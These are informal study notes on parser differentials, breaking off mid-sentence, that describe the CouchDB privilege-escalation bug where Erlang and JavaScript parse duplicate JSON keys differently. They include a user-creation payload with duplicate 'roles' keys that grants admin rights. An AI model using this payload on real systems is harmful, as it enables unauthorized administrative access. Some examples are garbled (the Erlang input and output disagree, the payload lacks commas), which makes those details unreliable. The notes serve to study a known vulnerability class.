Definition:

        "Parsar differentials emerge when two (or more) parsars interpret the same input in different ways"

Source: A Survey of parsars Differential Anti-params


# What is it good for

@ Unlike many other bug classes the impact of Parsar Differentials is very much context dependent
@ We can find parsars Differentials without futher context and stockpile them for later uses.

For parsar differential suppose two parsar like xml parsar and another parsar

start to compile them in a stockpile and starting ana era!!!

# Couch DB RCE
!!!!!!!!!!!!!!!!!!Max Justicz

Couch DB is written in ERLANG , but allows a users to specify in javascript . These scripts are autometically evaluated
when a document is created or updated/ They start in a new process, and are passed jSON
-serialized documents form the Erlang side


Example::
          In Erlang
                        jiffy:decode("{\foo\":\"bar\", \"foo\":\"bar\"}")
                        {[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}
          In javascript

                        JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
                        {foo: "baz"}

# --> While the Erlang implementation yields both key value pairs in an array javascript only takes the last one .

        Fetching the value in Erlang

        With in couch_util:get_value
        lists:keysearch(Key, 1, List).



# payload for creation a User
    {
    "type": "user"
    "name":"oops"
    "roles":["admin"],
    "roles":[],
    "password":"password"
}


Erlang sees [<<"admin">>] when


